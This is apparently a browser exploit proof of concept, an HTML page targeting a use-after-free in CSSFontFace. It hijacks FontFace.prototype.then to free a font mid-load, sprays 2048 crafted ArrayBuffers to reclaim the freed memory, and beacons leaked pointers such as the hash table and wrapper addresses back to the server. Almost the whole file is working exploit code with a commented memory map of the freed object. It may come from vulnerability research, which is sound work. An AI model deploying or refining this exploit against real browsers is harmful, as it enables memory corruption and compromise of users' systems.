<!--
  p581: Full CSSFontFace characterization dump.
  vincenzoiacovone recipe: no dummy, 2048 spray, safety fields post-loop.
  Dumps all 24 qwords of the hit buffer at 60ms, 400ms, 1000ms.
  Tells us exactly which offsets the engine writes and when.

  Expected beacons:
    G         = start
    F         = font freed inside getter
    S<n>      = spray done (2048)
    <t>H<i>,rc=<d>  = hit at buffer i with refcount d
    <t>D0:<8 qwords> = bytes 0x00-0x3F
    <t>D1:<8 qwords> = bytes 0x40-0x7F
    <t>D2:<8 qwords> = bytes 0x80-0xBF
    <t>MISS          = no hit at this scan
    NHITS=<n>        = total hit count at 2s
    ALIVE / ALIVE2   = survival markers

  Qword map:
    q0  +0x00  rc (expect 3 if engine bumped)
    q10 +0x50  kc (keyCount)
    q11 +0x58  T  (HashTable m_table ptr)
    q12 +0x60  opCount(lo) + maxOp(hi) — our safety
    q13 +0x68  W  (wrapper ptr)
    q16 +0x80  status byte at +0x82

  CRASH_CLASS: HIGH
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}

function main(){
b('G');
var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(pa);void pa.loaded;
var fired=0;
Object.defineProperty(FontFace.prototype,'then',{configurable:true,
get:function(){if(fired)return;fired=1;
document.getElementById('v').remove();
try{document.fonts.delete(this);}catch(e){}
document.body.offsetHeight;
b('F');
var lane=[];
for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
for(var j=0;j<lane.length;j++){
  wD(lane[j],0x00,2);
  wD(lane[j],0x60,0);
  wD(lane[j],0x64,0xFFFFFFFF);
  lane[j][0x82]=3;
}
b('S'+lane.length);
window._l=lane;
return;},set:function(){}});

document.fonts.load('1em pa, sa','AB').then(function(){},function(){});

function scan(tag){
  var lane=window._l;if(!lane)return;
  var hi=window._hi;
  if(hi===undefined){
    for(var i=0;i<lane.length;i++){
      var v=lane[i],rc=rD(v,0);
      var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
      if(rc!==2||t0){window._hi=i;hi=i;break;}
    }
  }
  if(hi===undefined){b(tag+'MISS');return;}
  var v=lane[hi];
  b(tag+'H'+hi+',rc='+rD(v,0));
  var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';
  b(tag+'D0:'+d);
  d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';
  b(tag+'D1:'+d);
  d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';
  b(tag+'D2:'+d);
}

setTimeout(function(){scan('A');},60);
setTimeout(function(){scan('B');},400);
setTimeout(function(){scan('C');},1000);
setTimeout(function(){b('ALIVE');},500);
setTimeout(function(){
  b('ALIVE2');
  var lane=window._l;if(!lane)return;
  var n=0;
  for(var i=0;i<lane.length;i++){
    var rc=rD(lane[i],0);
    var t0=lane[i][0x58]|lane[i][0x59]|lane[i][0x5A]|lane[i][0x5B]|lane[i][0x5C]|lane[i][0x5D]|lane[i][0x5E]|lane[i][0x5F];
    if(rc!==2||t0)n++;
  }
  b('NHITS='+n);
},2000);
}
setTimeout(main,0);
</script></head><body>p</body></html>
